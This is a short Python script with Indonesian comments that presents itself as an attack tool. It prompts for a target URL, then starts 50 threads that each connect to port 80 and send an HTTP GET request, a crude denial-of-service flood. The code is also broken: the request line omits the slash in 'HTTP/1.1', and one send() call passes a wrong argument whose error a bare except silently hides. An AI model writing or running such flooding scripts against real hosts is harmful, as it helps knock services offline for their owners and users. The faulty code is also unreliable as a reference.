import socket
import threading

# mengirim psrmintaan ke server
def Serangan(URL, PORT):
  # soket tcp
  user = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  try:
    user.connect((URL, PORT))
    user.send(b"GET / HTTP1.1\r\n")
    user.send(b"Host :" + bytes(URL, "utf-8") + b"\r\n\r\n", (URL, PORT))
    user.close()
  except:
    pass

URL = input("MASUKAN URL TARGER : ") # input ip targer

PORT = 80 # port tcp

#jumlah yang menyerang
jumlah = 50

for i in range(jumlah):
  thread = threading.Thread(target=Serangan, args=(URL, PORT))
  thread.start()
